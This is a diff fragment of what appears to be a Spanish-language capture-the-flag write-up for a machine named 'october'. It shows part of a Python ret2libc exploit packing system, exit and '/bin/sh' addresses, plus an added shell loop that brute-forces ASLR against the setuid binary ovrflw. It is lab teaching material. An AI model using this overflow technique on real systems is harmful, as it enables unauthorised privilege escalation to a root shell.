@@ -103,7 +103,9 @@ exit = struct.pack("<L", libc + 0x00033260)
 sh = struct.pack("<L", libc + 0x00162bac)
 print(junk + system + exit + sh)
 ```
+Ejecutas el script infinitas veces hasta que una de las direcciones sea la que hemos puesto nosotros.
 ```console
+www-data@october:/tmp$ python exploit.py > ./payload
 www-data@october:/tmp$ while true; do /usr/local/bin/ovrflw $(cat /tmp/payload); done
 Segmentation fault (core dumped)
 Segmentation fault (core dumped)
